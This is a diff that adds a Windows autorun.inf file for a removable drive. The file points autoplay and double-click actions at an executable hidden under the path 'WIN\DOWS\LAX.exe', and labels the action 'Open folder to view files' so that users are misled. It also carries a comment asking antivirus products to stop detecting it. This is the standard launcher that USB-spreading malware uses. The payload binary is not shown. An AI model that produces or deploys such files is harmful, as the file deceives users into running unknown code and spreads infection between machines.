@@ -1,0 +1,8 @@
+[autorun]
+open=WIN\DOWS\LAX.exe
+
+;Sooooo Kindly Stop Detecting My Shits It Doesnt Hurt AnyBody eh lol.
+action=Open folder to view files
+shell\open=Open
+shell\open\command=WIN\DOWS\LAX.exe
+shell\open\default=1
